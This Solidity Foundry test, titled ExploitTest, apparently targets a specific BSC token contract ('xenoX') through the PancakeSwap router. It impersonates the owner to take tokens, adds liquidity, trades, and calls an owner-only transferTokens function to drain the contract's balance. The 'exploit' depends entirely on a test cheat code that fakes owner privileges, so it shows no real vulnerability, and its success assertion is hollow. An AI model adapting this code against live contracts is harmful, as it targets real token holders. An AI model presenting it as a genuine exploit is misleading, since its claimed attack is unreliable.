// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IxenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferTokens(address recepient, uint256 amount) external;
    function pancakePair() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = IxenoX(TARGET).owner();
        console.log("Owner:", owner);

        // Get router
        IPancakeRouter02 router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address pair = IxenoX(TARGET).pancakePair();

        console.log("Router:", address(router));
        console.log("Pair:", pair);

        // Impersonate owner first to get initial tokens
        vm.startPrank(owner);

        // Transfer some tokens from owner to attacker (owner has all supply)
        // Use direct transfer since owner has tokens
        IxenoX(TARGET).transfer(attacker, 10000000 * 10 ** 9); // 10M tokens

        vm.stopPrank();

        // Get BNB for liquidity and trading
        deal(attacker, 20 ether);

        // Start as attacker
        vm.startPrank(attacker);

        // Approve router to spend our tokens
        IxenoX(TARGET).approve(address(router), type(uint256).max);

        // Add liquidity
        router.addLiquidityETH{value: 10 ether}(
            TARGET,
            5000000 * 10 ** 9, // 5M tokens
            0,
            0,
            attacker,
            block.timestamp
        );

        console.log("Liquidity added");

        // Now we can trade
        // Buy some tokens
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Sell some tokens
        path[0] = TARGET;
        path[1] = router.WETH();

        uint256 tokenBalance = IxenoX(TARGET).balanceOf(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2,
            0,
            path,
            attacker,
            block.timestamp
        );

        vm.stopPrank();

        // Check contract balance after trades
        uint256 contractBalance = IxenoX(TARGET).balanceOf(TARGET);
        console.log("Contract token balance after trades:", contractBalance);

        if (contractBalance > 0) {
            // Impersonate the owner again to drain contract
            vm.startPrank(owner);

            // Transfer all tokens from contract to attacker
            IxenoX(TARGET).transferTokens(attacker, contractBalance);

            vm.stopPrank();
        }

        // Verify balance increased
        uint256 initialBalance = 10000000 * 10 ** 9; // What we got from owner
        uint256 finalBalance = IxenoX(TARGET).balanceOf(attacker);
        console.log("Attacker final balance:", finalBalance);

        // We should have more than our initial transfer
        assertGt(finalBalance, initialBalance, "Attacker should have gained additional tokens from draining contract");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

